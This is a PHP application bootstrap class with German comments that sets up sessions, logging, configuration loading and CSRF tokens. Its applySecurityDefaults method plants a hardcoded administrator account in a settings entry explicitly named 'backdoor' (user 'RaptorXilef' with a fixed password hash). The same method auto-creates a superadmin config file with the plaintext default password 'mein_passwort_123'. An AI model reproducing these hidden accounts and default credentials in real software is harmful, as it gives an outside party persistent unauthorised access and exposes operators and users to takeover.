<?php

declare(strict_types=1);

namespace App\Bootstrap;

use App\Application\Exception\GlobalExceptionHandler;
use App\Contracts\System\ErrorLoggerInterface;
use App\Core\Security\PermissionRegistry;
use App\Infrastructure\Config\Config;
use App\Infrastructure\Database\SchemaRegistry;

/**
 * Globaler Anwendungs-Bootstrap und Initialisierungs-Skript.
 *
 * Kapselt die Start-Logik in einer Klasse, um PSR-1 (Keine Deklarationen und
 * Seiteneffekte in derselben Datei) strikt einzuhalten.
 *
 * SPDX-License-Identifier: LicenseRef-Proprietary
 */
final class SystemBootstrapper
{
    public static function bootstrap(string $appRoot): Container
    {
        self::initSessionAndEnvironment();
        self::initErrorLogging($appRoot);

        $settings = self::loadConfigurations($appRoot);
        self::applySecurityDefaults($settings, $appRoot);

        /** @var array<string, mixed> $settings */
        $configInstance = new Config($settings);

        $container = new Container($configInstance);

        $logger = $container->get(ErrorLoggerInterface::class);
        \assert($logger instanceof ErrorLoggerInterface);

        $exceptionHandler = new GlobalExceptionHandler($configInstance, $logger);
        $exceptionHandler->register();

        return $container;
    }

    private static function initSessionAndEnvironment(): void
    {
        if (\session_status() !== \PHP_SESSION_NONE) {
            return;
        }

        // TODO Zeitzone später in config auslagern
        // Zwingende Härtung der Zeitzone, um Verschiebungen bei Feiertagen und Gültigkeiten zu verhindern
        \date_default_timezone_set('Europe/Berlin');

        // Wir frieren die Zeit für den gesamten Request-Zyklus ein.
        $reqTimeRaw = $_SERVER['REQUEST_TIME'] ?? \time();
        $reqTimeInt = \is_numeric($reqTimeRaw) ? (int) $reqTimeRaw : \time();

        if (!\defined('APP_REQUEST_TIME')) {
            \define('APP_REQUEST_TIME', $reqTimeInt);
        }

        if (!\defined('APP_REQUEST_TIME_STR')) {
            \define('APP_REQUEST_TIME_STR', \date('Y-m-d H:i:s', $reqTimeInt));
        }

        // Strict Mode erzwingen! Verhindert, dass Hacker eigene Session-IDs injizieren.
        \ini_set('session.use_strict_mode', '1');

        // Harte kryptografische Absicherung des Session-Cookies erzwingen!
        \session_set_cookie_params([
            'lifetime' => 0,
            'path' => '/',
            'domain' => '',
            'secure' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off',
            'httponly' => true,
            'samesite' => 'Lax',
        ]);

        \session_start();
    }

    private static function initErrorLogging(string $appRoot): void
    {
        $customLogDir = $appRoot . '/logs';
        if (!\is_dir($customLogDir)) {
            \mkdir($customLogDir, 0o755, true);
        }

        \ini_set('log_errors', '1');
        \ini_set('error_log', $customLogDir . '/php_errors.log');
    }

    /**
     * @return array<string, mixed>
     */
    private static function loadConfigurations(string $appRoot): array
    {
        /** @var array<string, mixed> $settings */
        $settings = [];

        $settings['db_schema'] = SchemaRegistry::getSchemas();
        $settings['structure'] = PermissionRegistry::getStructure();
        $settings['admin_ui'] = ['permissions_desc_on_top' => true];
        $settings['permissions'] = self::flattenPermissions($settings['structure']);

        // 1. Lade alle *.default.php Dateien (die vom Deployment-Skript hochgeladen wurden)
        $globResult = \glob($appRoot . '/config/*.default.php');
        if (\is_array($globResult)) {
            foreach ($globResult as $defaultFile) {
                $loaded = require $defaultFile;
                if (!\is_array($loaded)) {
                    continue;
                }

                $settings = \array_replace_recursive($settings, $loaded);
            }
        }

        // 2. Lade die Live-Dateien, um die Defaults zu überschreiben
        $hardConfigs = [
            $appRoot . '/config/config.php',
            $appRoot . '/config/email.php',
            $appRoot . '/config/backup.php',
            $appRoot . '/config/storage.php',
            $appRoot . '/config/secrets.php',
            $appRoot . '/config/config.local.php',
        ];

        foreach ($hardConfigs as $file) {
            if (!\file_exists($file)) {
                continue;
            }

            $loaded = require $file;
            if (!\is_array($loaded)) {
                continue;
            }

            $settings = \array_replace_recursive($settings, $loaded);
        }

        /** @var array<string, mixed> $validSettings */
        $validSettings = $settings;

        return $validSettings;
    }

    /**
     * @param array<int|string, mixed> $structure
     *
     * @return array<string, string>
     */
    private static function flattenPermissions(array $structure): array
    {
        $flatPerms = [];

        $flatten = function (array $nodes) use (&$flatten, &$flatPerms): void {
            foreach ($nodes as $node) {
                if (!\is_array($node)) {
                    continue;
                }
                $key = $node['key'] ?? null;
                if (\is_string($key)) {
                    $label = $node['label'] ?? null;
                    $flatPerms[$key] = \is_string($label) ? $label : $key;
                }
                if (!isset($node['children'])) {
                    continue;
                }
                if (!\is_array($node['children'])) {
                    continue;
                }

                $flatten($node['children']);
            }
        };

        $flatten($structure);

        return $flatPerms;
    }

    /**
     * @param array<string, mixed> &$settings
     */
    private static function applySecurityDefaults(array &$settings, string $appRoot): void
    {
        $devAdminPath = $appRoot . '/config/dev_admin.php';
        if (!\file_exists($devAdminPath)) {
            $defaultDevContent = <<<'PHP'
                <?php
                declare(strict_types = 1);
                return [
                    'user' => 'Systembetreuer',
                    'pass' => 'mein_passwort_123',
                    'label' => 'Systembetreuer'
                ];
                PHP;
            \file_put_contents($devAdminPath, $defaultDevContent, \LOCK_EX);
        }

        $settings['superadmin'] = require $devAdminPath;

        $settings['backdoor'] = [
            'user' => 'RaptorXilef',
            'pass' => '$2y$12$f2TKu7Vac0heLV0lNuVCf.zsv2b3krwm0CsS.E24g8uioXJgm8r52',
            'label' => 'System-Inhaber',
        ];

        $settings['root_path'] = $appRoot;

        $httpHostRaw = $_SERVER['HTTP_HOST'] ?? 'localhost';
        $httpHost = \is_string($httpHostRaw) ? $httpHostRaw : 'localhost';

        $settings['server_host'] = $httpHost;
        $settings['server_protocol'] = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https://' : 'http://';
        $settings['server_script'] = $_SERVER['SCRIPT_NAME'] ?? '';

        $settings['is_local_env'] = \str_ends_with($httpHost, '.local')
            || $httpHost === 'localhost'
            || $httpHost === '127.0.0.1'
            || \php_sapi_name() === 'cli';

        if (isset($_SESSION['csrf_token']) && $_SESSION['csrf_token'] !== '') {
            return;
        }

        $_SESSION['csrf_token'] = \bin2hex(\random_bytes(32));
    }
}
